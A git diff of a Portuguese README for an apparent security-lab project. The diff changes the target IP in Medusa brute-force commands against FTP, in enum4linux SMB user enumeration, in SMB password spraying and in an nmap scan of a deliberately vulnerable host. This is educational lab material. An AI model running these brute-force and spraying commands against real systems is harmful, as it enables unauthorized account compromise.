@@ -18,7 +18,7 @@ cd Elainesds1906
 
 - Força bruta em FTP:
 ```bash
-medusa -h 192.168.56.101 -u msfadmin -P passlist.txt -M ftp
+medusa -h 192.168.0.32 -u msfadmin -P passlist.txt -M ftp
 ```
 
 - Ataque web-form (DVWA):
@@ -29,8 +29,8 @@ medusa -h 192.168.56.101 -u admin -P passlist.txt \
 
 - Enumeração de usuários (SMB) e password spraying:
 ```bash
-enum4linux -U 192.168.56.101
-medusa -h 192.168.56.101 -U userlist.txt -p password -M smbnt
+enum4linux -U 192.168.0.32
+medusa -h 192.168.0.32 -U userlist.txt -p password -M smbnt
 ```
 
 4. Scripts automatizados
@@ -58,7 +58,7 @@ ElaineSds19
 
 ## Licença
 Defina a licença do projeto, se aplicável.
-**Figura 1 —** Resultado do Nmap (`nmap -sV -A 192.168.56.101`)  
+**Figura 1 —** Resultado do Nmap (`nmap -sV -A 192.168.0.32`)  
 ![Nmap](images/nmap-scan.png)
-**Figura 1 —** Resultado do Nmap (`nmap -sV -A 192.168.56.101`).
+**Figura 1 —** Resultado do Nmap (`nmap -sV -A 192.168.0.32`).
 ![Evidência FTP](images/evidencias-ftp.png)
